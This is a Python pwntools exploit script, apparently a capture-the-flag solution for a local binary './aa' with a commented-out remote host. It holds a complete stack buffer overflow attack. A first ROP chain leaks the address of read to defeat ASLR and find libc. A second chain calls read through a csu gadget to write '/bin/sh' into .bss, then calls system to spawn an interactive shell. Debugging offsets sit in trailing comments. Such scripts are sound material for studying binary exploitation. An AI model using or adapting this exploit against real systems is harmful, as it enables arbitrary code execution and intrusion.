#! /usr/bin/env python3
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['tmux','splitw','-h']


# p = remote('chuj.top', '33864')
p = process('./aa')
elf = ELF('./aa')
libc = ELF("./libpthread-2.31.so")
# libc = ELF("./libc-2.31.so")

def debug():
    gdb.attach(p)
    pause()

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
read_got = elf.got['read']
read_plt = elf.plt['read']

rdi_addr = 0x401313
ret_addr = 0x40101a
rsi_r15_addr = 0x401311
payload = b'a'*40 + p64(0x0000002c00000000) + p64(0) + p64(rdi_addr) + p64(read_got) + p64(puts_plt) + p64(0x4011BA)
debug()
p.sendline(payload)

log.success('read_addr: ' + hex(libc.sym['read']))
read_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
log.success('read_addr: ' + hex(read_addr))
libc.address = read_addr-libc.sym['read']
log.success('libc.address: ' + hex(libc.address))
system_addr = libc.sym['system']
log.success('system_addr: ' + hex(system_addr))


rop1 = 0x40130A
rop2 = 0x4012F0
bss = 0x404060
payload = b'a'*40 + p64(0x0000002c00000000) + p64(0) + p64(0x401306) + p64(1)+ p64(0) + p64(1) + p64(0) + p64(bss) + p64(0x10) + p64(read_got) + p64(rop2) + b"\x00"*56 + p64(rdi_addr) + p64(bss) +p64(ret_addr)+p64(system_addr)
# payload = b'a'*40 + p64(0x0000002c00000000) + p64(0) + p64(rdi_addr) + p64(read_addr-0x20A448)+p64(ret_addr)+p64(system_addr) + b'/bin/sh\x00'

# payload = b'a'*40 + p64(0x0000002c00000000) + p64(0) + p64(rdi_addr) + p64(read_addr-0x20A450)+p64(system_addr) + b'/bin/sh\x00'

p.sendline(payload)
p.sendline(b'/bin/sh\x00')
p.interactive()

# 0x7f0c41e4f380
# 0x7f0c41c21f38
# 0x22D448

# 0x7f45ad35b380
# 0x7f45ad150f38
# 0x20A448

# 0x7f3e287a2380
# 0x7f3e28597f30
# 0x20A450
